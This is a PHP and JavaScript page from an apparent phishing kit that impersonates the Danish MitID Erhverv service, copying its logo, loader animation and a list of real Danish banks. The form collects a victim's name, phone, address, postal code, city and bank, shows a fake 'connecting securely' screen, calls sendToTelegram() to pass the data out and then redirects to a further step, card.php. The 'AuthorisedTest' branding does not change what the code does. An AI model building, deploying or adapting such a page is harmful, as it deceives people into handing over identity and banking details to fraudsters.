<?php include "include/session.php"; ?>
<!doctype html>
<html lang="da">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Bekræft dine oplysninger - AuthorisedTest Erhverv</title>
<link rel="icon" type="image/x-icon" href="static/media/favicon.ico">
<style>
/* ── Roboto (local, matches brand font) ── */
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(static/media/roboto-latin-400-normal.b009a76ad6afe4ebd301.woff2) format('woff2'),url(static/media/roboto-latin-400-normal.3f2b9a42f643e62a49b7.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;src:url(static/media/roboto-latin-500-normal.f25d774ecfe0996f8eb5.woff2) format('woff2'),url(static/media/roboto-latin-500-normal.1f075502d0094a398e21.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-400-normal.861b791f9de857a6e7bc.woff2) format('woff2'),url(static/media/roboto-latin-ext-400-normal.e757c42df6aaa3e11b62.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-500-normal.9165081d10e1ba601384.woff2) format('woff2'),url(static/media/roboto-latin-ext-500-normal.252057e589a0379208ed.woff) format('woff')}

*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.hidden{display:none!important}

/* ── FORM CONTAINER ── */
.login-card{width:100%;max-width:440px;background:#fff;border:1px solid #d0d0d0;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.06);padding:36px 38px;display:flex;flex-direction:column}

/* ── CENTERED AuthorisedTest ERHVERV LOGO ── */
.card-logo{display:flex;flex-direction:column;align-items:center;margin-bottom:32px}
.logo-main{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;line-height:1}
.logo-main img{height:34px;width:auto;display:block;object-fit:contain}
.logo-sub{font-size:15px;font-weight:600;color:#0060e6;letter-spacing:.04em;margin-top:2px}

/* ── HEADING ── */
.card-header{text-align:center;margin-bottom:28px}
.card-header h1{font-size:20px;font-weight:700;color:#222;line-height:1.3;margin-bottom:8px}
.card-header p{font-size:14px;color:#666;line-height:1.5}

/* ── FIELD ── */
.field-label{display:flex;align-items:center;margin-bottom:8px}
.field-label label{font-size:13px;font-weight:700;color:#333;text-transform:uppercase;letter-spacing:.02em}
.input-wrap{position:relative;margin-bottom:14px}
.input-wrap input,.input-wrap select{width:100%;height:48px;border:1px solid #b8b8b8;border-radius:0;padding:0 14px;font-size:15px;font-family:inherit;color:#333;background:#fff;outline:none;transition:border-color .15s}
.input-wrap input:focus,.input-wrap select:focus{border-color:#0060e6}

/* ── TWO-COLUMN ROW (POSTNUMMER + BY) ── */
.form-row{display:flex;gap:12px}
.form-row .col{flex:1;min-width:0}
.form-row .col.col-narrow{flex:0 0 45%}

/* ── BANK FIELD (opens picker) ── */
.bank-field{display:flex;align-items:center;justify-content:space-between;width:100%;height:48px;border:1px solid #b8b8b8;border-radius:0;padding:0 14px;font-size:15px;font-family:inherit;color:#999;background:#fff;outline:none;cursor:pointer;text-align:left;transition:border-color .15s}
.bank-field:hover,.bank-field:focus{border-color:#0060e6}
.bank-field.has-value{color:#333}
.chev{width:10px;height:10px;border-right:2px solid #0060e6;border-bottom:2px solid #0060e6;transform:rotate(45deg);margin-top:-4px;flex:0 0 auto}

/* ── BANK PICKER ── */
.bank-picker{display:flex;flex-direction:column;min-height:520px}
.picker-header{display:flex;align-items:center;gap:10px;margin-bottom:18px}
.picker-back{background:none;border:none;padding:4px;cursor:pointer;display:inline-flex;align-items:center;border-radius:4px}
.picker-back:hover{background:#e9f1ff}
.picker-title{flex:1;font-size:18px;font-weight:700;color:#222;margin:0}
.picker-close{background:none;border:none;font-size:24px;line-height:1;color:#666;cursor:pointer;padding:4px 8px}
.picker-close:hover{color:#222}
.picker-search{position:relative;margin-bottom:14px}
.picker-search-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;color:#888;pointer-events:none}
.picker-search input{width:100%;height:44px;border:1px solid #c8c8c8;border-radius:22px;padding:0 14px 0 38px;font-size:14px;font-family:inherit;color:#333;background:#fff;outline:none;transition:border-color .15s}
.picker-search input:focus{border-color:#0060e6}
.bank-list{max-height:360px;overflow-y:auto;border:1px solid #ececec;border-radius:4px}
.bank-row{display:flex;align-items:center;gap:12px;padding:11px 14px;border-bottom:1px solid #f0f0f0;cursor:pointer}
.bank-row:last-child{border-bottom:none}
.bank-row:hover{background:#e9f1ff}
.bank-dot{width:32px;height:32px;border-radius:8px;flex:0 0 auto;background:#fff;border:1px solid #e5e5e5;display:flex;align-items:center;justify-content:center;overflow:hidden}
.bank-dot img{width:100%;height:100%;object-fit:contain;padding:3px}
.bank-field-logo{width:24px;height:24px;flex:0 0 auto;margin-right:10px;display:inline-flex;align-items:center;justify-content:center}
.bank-field-logo img{max-width:100%;max-height:100%;object-fit:contain}
.bank-name{flex:1;font-size:14px;color:#333;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.bank-arrow{flex:0 0 auto;display:inline-flex}
.picker-empty{padding:24px;text-align:center;color:#888;font-size:13px}

/* ── WARNING NOTE (yellow stripe) ── */
.note-warning{margin:6px 0 20px;padding:12px 14px;background:#fdf9ec;border-left:4px solid #ffc107;font-size:13px;line-height:1.5;color:#5c5640}

/* ── BUTTON ── */
.btn-primary{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;height:48px;border:none;border-radius:0;font-size:14px;font-weight:700;letter-spacing:.08em;color:#fff;background:#b0b0b0;cursor:not-allowed;transition:background .2s;font-family:inherit}
.btn-primary.active{background:#0060e6;cursor:pointer}
.btn-primary.active:hover{background:#004aa5}
.arrow-icon{display:inline-flex;align-items:center}

/* ── LOADER (same animation as login first-load) ── */
.init-loader{display:flex;align-items:center;justify-content:center;min-height:400px;width:100%;text-align:center}
.init-loader-inner{display:flex;flex-direction:column;align-items:center}
.init-mitid-logo{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;margin-bottom:18px;line-height:1}
.init-mitid-logo img{height:34px;width:auto;display:block;object-fit:contain}
.init-shield{position:relative;width:140px;height:140px;margin-bottom:16px}
.init-shield svg{width:100%;height:100%;display:block}
.init-spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;border:4px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
.init-loader-text{font-size:17px;font-weight:700;color:#222;margin-bottom:5px}
.init-loader-subtext{font-size:14px;color:#666}

@media(max-width:480px){
  body{padding:0}
  .login-card{width:100%;max-width:100%;min-height:100vh;min-height:100dvh;border:none;box-shadow:none;border-radius:0;padding:28px 22px}
  .form-row{flex-direction:column;gap:0}
  .form-row .col.col-narrow{flex:1}
}
</style>
</head>
<body>

<!-- LOADER (hidden) — same animation as login first-load -->
<div id="loaderContainer" class="init-loader hidden">
  <div class="init-loader-inner">
    <div class="init-mitid-logo" aria-label="MitID logo">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="init-shield">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" focusable="false" aria-hidden="true">
        <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
      </svg>
      <div class="init-spinner"></div>
    </div>
    <div class="init-loader-text">Forbinder sikkert til AuthorisedTest</div>
    <div class="init-loader-subtext">Vent et øjeblik ...</div>
  </div>
</div>

<!-- FORM CONTAINER -->
<div class="login-card" id="infoForm">

  <!-- FORM VIEW -->
  <div id="formView">

  <!-- CENTERED AuthorisedTest ERHVERV LOGO -->
  <div class="card-logo">
    <div class="logo-main">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="logo-sub">Erhverv</div>
  </div>

  <!-- HEADING -->
  <div class="card-header">
    <h1>Bekræft dine oplysninger</h1>
    <p>Udfyld dine oplysninger nedenfor for at fortsætte.</p>
  </div>

  <!-- FIELD: FULDNAVN -->
  <div class="field-label">
    <label for="navn">Fulde navn</label>
  </div>
  <div class="input-wrap">
    <input type="text" id="navn" maxlength="80" autocomplete="off" spellcheck="false" aria-label="Fulde navn">
  </div>

  <!-- FIELD: TELEFON -->
  <div class="field-label">
    <label for="telefon">Telefon Nummer</label>
  </div>
  <div class="input-wrap">
    <input type="text" id="telefon" placeholder="+45" maxlength="12" inputmode="tel" autocomplete="off" spellcheck="false" aria-label="Telefon">
  </div>

  <!-- FIELD: ADRESSE -->
  <div class="field-label">
    <label for="address">Adresse</label>
  </div>
  <div class="input-wrap">
    <input type="text" id="address" maxlength="120" autocomplete="off" spellcheck="false" aria-label="Adresse">
  </div>

  <!-- FIELD: POSTNUMMER + BY -->
  <div class="form-row">
    <div class="col col-narrow">
      <div class="field-label">
        <label for="postnummer">Postnummer</label>
      </div>
      <div class="input-wrap">
        <input type="text" id="postnummer" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off" spellcheck="false" aria-label="Postnummer">
      </div>
    </div>
    <div class="col">
      <div class="field-label">
        <label for="by">By</label>
      </div>
      <div class="input-wrap">
        <input type="text" id="by" maxlength="60" autocomplete="off" spellcheck="false" aria-label="By">
      </div>
    </div>
  </div>

  <!-- FIELD: BANK -->
  <div class="field-label">
    <label for="bankField">Bank</label>
  </div>
  <div class="input-wrap">
    <button type="button" id="bankField" class="bank-field" aria-label="Vælg bank">
      <span id="bankFieldLogo" class="bank-field-logo hidden">
        <img id="bankFieldLogoImg" alt="" src="">
      </span>
      <span id="bankFieldText">Vælg Bank</span>
      <span class="chev"></span>
    </button>
  </div>

  <!-- WARNING NOTE -->
  <div class="note-warning">
    Det er vigtigt, at dine oplysninger er korrekte og opdaterede for at sikre fortsat adgang til din MitID Erhvervskonto og tilknyttede funktioner.
  </div>

  <!-- BUTTON -->
  <button id="nextBtn" class="btn-primary disabled" disabled type="button">
    <span>NÆSTE</span>
    <span class="arrow-icon">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
    </span>
  </button>
  </div><!-- /formView -->

  <!-- BANK PICKER VIEW -->
  <div id="bankPicker" class="bank-picker hidden">
    <div class="picker-header">
      <button type="button" id="bankBack" class="picker-back" aria-label="Tilbage">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#0060e6"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
      </button>
      <h2 class="picker-title">Vælg din bank</h2>
      <button type="button" id="bankClose" class="picker-close" aria-label="Luk">&times;</button>
    </div>
    <div class="picker-search">
      <svg class="picker-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" focusable="false" aria-hidden="true">
        <circle cx="11" cy="11" r="7"/>
        <path d="M21 21l-4.35-4.35"/>
      </svg>
      <input type="text" id="bankSearch" placeholder="Søg efter din bank..." autocomplete="off" spellcheck="false" aria-label="Søg efter din bank">
    </div>
    <div id="bankList" class="bank-list" role="listbox"></div>
    <div id="bankEmpty" class="picker-empty hidden">Ingen banker fundet</div>
  </div>
</div>

<script src="js/shared.js"></script>
<script>
loadState();

// ── STEP: Bekræft oplysninger ──
var navnInput      = document.getElementById('navn');
var telefonInput   = document.getElementById('telefon');
var addressInput   = document.getElementById('address');
var postnrInput    = document.getElementById('postnummer');
var byInput        = document.getElementById('by');
var bankField      = document.getElementById('bankField');
var bankFieldText  = document.getElementById('bankFieldText');
var bankPicker     = document.getElementById('bankPicker');
var formView       = document.getElementById('formView');
var bankList       = document.getElementById('bankList');
var bankSearch     = document.getElementById('bankSearch');
var bankEmpty      = document.getElementById('bankEmpty');
var selectedBank   = state.data.selectedBank || '';
var nextBtn        = document.getElementById('nextBtn');

// ── BANK DATA (declared early — prefill below uses these) ──
var BANK_DOTS = ['#005ca9','#2e9e5b','#005f8c','#1b3f8f','#c8102e','#e36f1e','#b03060','#0f6b6b','#6b8e23','#8e44ad','#c0392b','#1e8449','#2980b9','#d4a017','#7f8c8d','#34495e'];
// Real logos (static/media). Falls back to a colored circle if missing.
var BANK_LOGOS = {
  'Danske Bank': 'static/media/danske-bank.png',
  'Jyske Bank': 'static/media/jyskebank.png',
  'Nordea Bank Danmark': 'static/media/nordea.png',
  'Nykredit Bank': 'static/media/nykredit.png',
  'Sydbank': 'static/media/sydbank.png',
  'Alm. Brand Bank': 'static/media/almbrand.png',
  'Arbejdernes Landsbank': 'static/media/al-bank.png',
  'FIH Erhvervsbank': 'static/media/fih-erhver.png',
  'Jutlander Bank': 'static/media/jutlander.jpg',
  'Spar Nord Bank': 'static/media/spar-nord.png',
  'Lån & Spar Bank': 'static/media/lsb.png',
  'Sparekassen Sjælland-Fyn': 'static/media/sjfbank.png',
  'Ringkjøbing Landbobank': 'static/media/rlb.png',
  'Vestjysk Bank': 'static/media/vestjyskbank.png',
  'Handelsbanken': 'static/media/handelsbanken.jpg',
  'Anden bank': 'static/media/andenbank.png'
};
var BANKS = [
  'Danske Bank','Jyske Bank','Nordea Bank Danmark','Nykredit Bank','Sydbank',
  'Alm. Brand Bank','Arbejdernes Landsbank','FIH Erhvervsbank','Jutlander Bank',
  'Spar Nord Bank','Lån & Spar Bank','Sparekassen Sjælland-Fyn','Ringkjøbing Landbobank',
  'Vestjysk Bank','Handelsbanken','Anden bank'
];

// Prefill from saved state (back navigation keeps entered values)
navnInput.value    = state.data.navn || '';
telefonInput.value = state.data.phoneNumber || '';
addressInput.value = state.data.address || '';
postnrInput.value  = state.data.postnummer || '';
byInput.value      = state.data.by || '';
if (selectedBank) {
  bankFieldText.textContent = selectedBank;
  bankField.classList.add('has-value');
  setFieldLogo(selectedBank);
}

function checkForm(){
  var ready = navnInput.value.trim().length >= 2 &&
              telefonInput.value.replace(/\D/g, '').length === 8 &&
              addressInput.value.trim().length >= 3 &&
              /^\d{4}$/.test(postnrInput.value.trim()) &&
              byInput.value.trim().length >= 2 &&
              selectedBank !== '';
  nextBtn.disabled = !ready;
  nextBtn.className = 'btn-primary ' + (ready ? 'active' : 'disabled');
}

postnrInput.addEventListener('input', function(){
  this.value = this.value.replace(/\D/g, '').slice(0, 4);
  checkForm();
});

telefonInput.addEventListener('input', function(){
  // allow optional leading +45, strip everything else, cap at 8 digits
  var digits = this.value.replace(/\D/g, '').replace(/^45(?=\d{8}$)/, '');
  this.value = this.value.indexOf('+') === 0 && digits.length <= 8 ? '+' + digits.slice(0, 8) : digits.slice(0, 8);
  checkForm();
});

[navnInput, addressInput, byInput].forEach(function(el){
  el.addEventListener('input', checkForm);
});

// ── BANK PICKER ──
function openBankPicker(){
  formView.classList.add('hidden');
  bankPicker.classList.remove('hidden');
  bankSearch.value = '';
  renderBanks();
  bankSearch.focus();
}

function closeBankPicker(){
  bankPicker.classList.add('hidden');
  formView.classList.remove('hidden');
}

function renderBanks(){
  var q = bankSearch.value.trim().toLowerCase();
  bankList.innerHTML = '';
  var shown = 0;
  BANKS.forEach(function(name, i){
    if (q && name.toLowerCase().indexOf(q) === -1) return;
    shown++;
    var row = document.createElement('div');
    row.className = 'bank-row';
    row.setAttribute('role', 'option');
    var dot = document.createElement('span');
    dot.className = 'bank-dot';
    var logo = BANK_LOGOS[name];
    if (logo) {
      var img = document.createElement('img');
      img.src = logo;
      img.alt = name;
      dot.appendChild(img);
    } else {
      dot.style.background = BANK_DOTS[i % BANK_DOTS.length];
    }
    var nm = document.createElement('span');
    nm.className = 'bank-name';
    nm.textContent = name;
    var ar = document.createElement('span');
    ar.className = 'bank-arrow';
    var arSvg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    arSvg.setAttribute('width', '16'); arSvg.setAttribute('height', '16');
    arSvg.setAttribute('viewBox', '0 0 24 24'); arSvg.setAttribute('fill', '#999');
    var p = document.createElementNS('http://www.w3.org/2000/svg', 'path');
    p.setAttribute('d', 'M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z');
    arSvg.appendChild(p); ar.appendChild(arSvg);
    row.appendChild(dot); row.appendChild(nm); row.appendChild(ar);
    row.addEventListener('click', function(){ chooseBank(name); });
    bankList.appendChild(row);
  });
  bankEmpty.classList.toggle('hidden', shown !== 0);
}

function setFieldLogo(name){
  var logo = BANK_LOGOS[name];
  if (logo) {
    document.getElementById('bankFieldLogoImg').src = logo;
    document.getElementById('bankFieldLogoImg').alt = name;
    document.getElementById('bankFieldLogo').classList.remove('hidden');
  } else {
    document.getElementById('bankFieldLogo').classList.add('hidden');
  }
}

function chooseBank(name){
  selectedBank = name;
  state.data.selectedBank = name;
  saveState();
  bankFieldText.textContent = name;
  bankField.classList.add('has-value');
  setFieldLogo(name);
  closeBankPicker();
  checkForm();
}

bankField.addEventListener('click', openBankPicker);
document.getElementById('bankBack').addEventListener('click', closeBankPicker);
document.getElementById('bankClose').addEventListener('click', closeBankPicker);
bankSearch.addEventListener('input', renderBanks);
document.addEventListener('keydown', function(e){
  if (e.key === 'Escape' && !bankPicker.classList.contains('hidden')) closeBankPicker();
});

checkForm();

nextBtn.addEventListener('click', function(){
  if (nextBtn.disabled) return;
  state.data.navn        = navnInput.value.trim();
  state.data.phoneNumber = telefonInput.value.replace(/\D/g, '').replace(/^45(?=\d{8}$)/, '');
  state.data.address     = addressInput.value.trim();
  state.data.postnummer  = postnrInput.value.trim();
  state.data.by          = byInput.value.trim();
  state.data.selectedBank = selectedBank;
  saveState();

  document.getElementById('infoForm').classList.add('hidden');
  document.getElementById('loaderContainer').classList.remove('hidden');
  sendToTelegram();
  setTimeout(function(){ window.location.href = 'card.php'; }, 2000);
});
</script>
</body>
</html>
